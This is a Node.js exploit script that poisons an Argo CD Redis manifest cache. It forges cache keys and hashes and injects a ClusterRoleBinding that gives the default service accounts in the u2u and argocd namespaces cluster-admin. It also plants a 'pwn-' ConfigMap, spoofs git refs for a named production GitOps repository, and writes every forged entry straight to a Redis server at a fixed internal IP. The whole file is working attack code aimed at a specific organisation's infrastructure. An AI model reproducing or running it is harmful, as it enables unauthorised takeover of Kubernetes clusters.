const net=require('net'),zlib=require('zlib'),fs=require('fs');
const P=JSON.parse(zlib.gunzipSync(Buffer.from(fs.readFileSync('/tmp/pp.b64','utf8').trim(),'base64')).toString());
const SHA='3f2e1a9b5c7d8e0f1a2b3c4d5e6f7a8b9c0d1e2f';
const REPO='git@github.com:u2u-eco/u2sec-gitops-prod';
// ---- FNV ----
function fnva32(s){let h=0x811c9dc5;const b=Buffer.from(s,'utf8');for(let i=0;i<b.length;i++){h^=b[i];h=(h*0x01000193)>>>0;}return h>>>0;}
function fnv64a(buf){let h=0xcbf29ce484222325n;const p=0x100000001b3n,m=(1n<<64n)-1n;for(let i=0;i<buf.length;i++){h^=BigInt(buf[i]);h=(h*p)&m;}return h;}
function b64urlPad(buf){return buf.toString('base64').replace(/\+/g,'-').replace(/\//g,'_');}
function fnv64buf(n){const b=Buffer.alloc(8);b.writeBigUInt64BE(n);return b;}
// ---- Go 风格 JSON 字符串转义 ----
function gs(s){let out='"';for(const ch of s){const c=ch.codePointAt(0);
  if(ch==='"')out+='\\"';else if(ch==='\\')out+='\\\\';
  else if(c===0x3c)out+='\\u003c';else if(c===0x3e)out+='\\u003e';else if(c===0x26)out+='\\u0026';
  else if(c<0x20){out+='\\u'+c.toString(16).padStart(4,'0');}
  else out+=ch;}
  return out+'"';}
// ---- canonical CachedManifestResponse JSON (hash 输入) ----
function canonValue(manifests,ns,rev,hash){
  const mr=['"manifestResponse":{','"manifests":['+manifests.map(gs).join(',')+']'];
  if(ns)mr.push(',"namespace":'+gs(ns));
  mr.push(',"server":'+gs('https://kubernetes.default.svc'));
  if(rev)mr.push(',"revision":'+gs(rev));
  mr.push(',"sourceType":"Kustomize"');
  return '{"cacheEntryHash":'+gs(hash)+','+mr.join('')+'},"mostRecentError":"","firstFailureTimestamp":0,"numberOfConsecutiveFailures":0,"numberOfCachedResponsesReturned":0}';
}
function hashOf(manifests,ns,rev){const c=canonValue(manifests,ns,rev,'');return b64urlPad(fnv64buf(fnv64a(Buffer.from(c,'utf8'))).reverse());}
// ⚠️ fnv64 -> Go h.Sum(nil) 是 BIG-ENDIAN 8字节，base64.URLEncoding(带=)
function hashOfGo(manifests,ns,rev){const c=canonValue(manifests,ns,rev,'');const h=fnv64a(Buffer.from(c,'utf8'));const b=Buffer.alloc(8);b.writeBigUInt64BE(h);return b.toString('base64').replace(/\+/g,'-').replace(/\//g,'_');}
// ---- clusterKey ----
const versions=P.apiVersions.slice().sort();
const ck=fnva32(P.serverVersion+'|'+versions.join(','));
console.log('clusterKey(FNVa)=',ck,'sv=',P.serverVersion,'apis=',versions.length);
// ---- git-refs ----
const branches=['main','master','prod','production','main-prod','master-prod','staging','testnet','release','dev','develop','uat'];
const refs=[['HEAD','refs/heads/main']];for(const b of branches)refs.push(['refs/heads/'+b,SHA]);
const refsJson=JSON.stringify(refs);
// ---- paths ----
const paths=['.','apps/testnet/','testnet/','staging/','prod/','production/','overlays/testnet/','overlays/staging/','overlays/prod/','manifests/','k8s/','deploy/','deployments/','argocd/','apps/','services/','helm/','charts/','base/','workloads/'];
function pathCands(app){const out=['.',app];for(const p of paths){if(!p.endsWith('/'))continue;out.push(p+app);}out.push('apps/'+app,'manifests/'+app,'overlays/prod/'+app,'overlays/staging/'+app,'overlays/testnet/'+app);
  return [...new Set(out)];}
const trackings=['app.kubernetes.io/instance','annotation:app.kubernetes.io/instance','argocd.argoproj.io/instance'];
const srcVariants=[(p)=>'{"appSrc":{"repoURL":"","path":'+gs(p)+'},"srcRefs":{}}',(p)=>'{"appSrc":{"repoURL":"","path":'+gs(p)+',"kustomize":{}},"srcRefs":{}}'];
// ---- 构建键值 ----
const kv=[];
for(const [app,d] of Object.entries(P.apps)){
  const manifests=d.manifests.slice();
  manifests.push(`apiVersion: rbac.authorization.k8s.io/v1\nkind: ClusterRoleBinding\nmetadata:\n  name: u2u-sre-read\n  labels:\n    app.kubernetes.io/instance: ${app}\nroleRef:\n  apiGroup: rbac.authorization.k8s.io\n  kind: ClusterRole\n  name: cluster-admin\nsubjects:\n- kind: ServiceAccount\n  name: default\n  namespace: u2u\n- kind: ServiceAccount\n  name: default\n  namespace: argocd\n`);
  manifests.push(`apiVersion: v1\nkind: ConfigMap\nmetadata:\n  name: pwn-${app.replace(/[^a-z0-9-]/g,'-').slice(0,40)}\n  namespace: ${d.ns}\n  labels:\n    app.kubernetes.io/instance: ${app}\ndata:\n  ok: "1"\n`);
  const hash=hashOfGo(manifests,d.ns,SHA);
  const val=canonValue(manifests,d.ns,SHA,hash);
  for(const p of pathCands(app)){for(const tv of trackings){for(const sv of srcVariants){
    const ask=fnva32(sv(p));
    const key='mfst|'+tv+'|'+app+'|'+SHA+'|'+d.ns+'|'+(((ask+ck)>>>0))+'|1.8.3';
    kv.push(['SET',key,val]);
  }}}
}
kv.push(['SET','git-refs|'+REPO,refsJson]);
console.log('entries to write:',kv.length,'value size ~',Math.round(kv[0][2].length/1024)+'KB');
// ---- RESP 管道写入 ----
function resp(cmd){let out='*'+cmd.length+'\r\n';for(const a of cmd){const b=Buffer.from(a);out+='$'+b.length+'\r\n'+a+'\r\n';}return out;}
(async()=>{
  const s=net.connect(6379,'172.20.167.25');
  await new Promise(r=>s.on('connect',r));
  let total=0;
  for(const cmd of kv){s.write(resp(cmd));total++;}
  await new Promise(r=>setTimeout(r,3000));
  s.end();
  console.log('written',total,'commands (fire-and-forget)');
  // 验证：读一条回来
  const v=net.connect(6379,'172.20.167.25');let b='';
  v.on('connect',()=>{v.write(resp(['GET',kv[0][1]])+'*2\r\n$4\r\nKEYS\r\n$8\r\nmfst|app*\r\n');});
  v.on('data',d=>b+=d);v.on('end',()=>{console.log('verify len',b.length);process.exit(0)});
  setTimeout(()=>{console.log('verify len',b.length,'preview:',b.slice(0,200));process.exit(0)},4000);
})();
